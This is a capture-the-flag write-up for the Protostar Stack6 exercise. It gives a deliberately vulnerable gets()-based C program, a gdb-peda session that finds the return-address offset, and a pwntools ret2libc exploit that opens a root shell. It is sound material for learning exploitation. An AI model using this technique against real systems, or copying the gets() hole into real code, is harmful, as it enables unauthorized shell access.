### Stack6

* Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
    char buffer[64];
    unsigned int ret;

    printf("input path please: "); fflush(stdout);

    gets(buffer);

    ret = __builtin_return_address(0);

    if((ret & 0xbf000000) == 0xbf000000) {
        printf("bzzzt (%p)\n", ret);
        _exit(1);
    }

    printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
    getpath();
}
```


* Solution

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080484fa <+0>:	push   ebp
   0x080484fb <+1>:	mov    ebp,esp
   0x080484fd <+3>:	and    esp,0xfffffff0
   0x08048500 <+6>:	call   0x8048484 <getpath>
   0x08048505 <+11>:	mov    esp,ebp
   0x08048507 <+13>:	pop    ebp
   0x08048508 <+14>:	ret    
End of assembler dump.
gdb-peda$ b *main+14
Breakpoint 1 at 0x8048508: file stack6/stack6.c, line 31.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/Desktop/bin/stack6 
input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
got path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x6e ('n')
EBX: 0x0 
ECX: 0x1 
EDX: 0xf7fa9890 --> 0x0 
ESI: 0xf7fa8000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x41344141 ('AA4A')
ESP: 0xffffd350 ("fAA5AAKAAgAA6AAL")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xffffd350 ("fAA5AAKAAgAA6AAL")
0004| 0xffffd354 ("AAKAAgAA6AAL")
0008| 0xffffd358 ("AgAA6AAL")
0012| 0xffffd35c ("6AAL")
0016| 0xffffd360 --> 0x0 
0020| 0xffffd364 --> 0xffffd3f4 --> 0xffffd571 ("/root/Desktop/bin/stack6")
0024| 0xffffd368 --> 0xffffd3fc --> 0xffffd58a ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0028| 0xffffd36c --> 0xffffd384 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern offset 0x41414a41
1094797889 found at offset: 80
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e0f7e0 <system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4e968 ("/bin/sh")
gdb-peda$ quit

root@kali:~/Desktop/bin# cat stack6_ex.py 
from pwn import *

system     = p32(0xf7e0f7e0)
dummy      = p32(0xFFFFFFFF)
binsh_addr = p32(0xf7f4e968)
offset     = 80

payload = "A" * offset + system + dummy + binsh_addr

p = process(['./stack6'])

p.sendline(payload)

p.interactive()

root@kali:~/Desktop/bin# python stack6_ex.py 
[+] Starting local process './stack6': pid 3687
[*] Switching to interactive mode
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�������\xffh���
$ whoami
root
$  
```
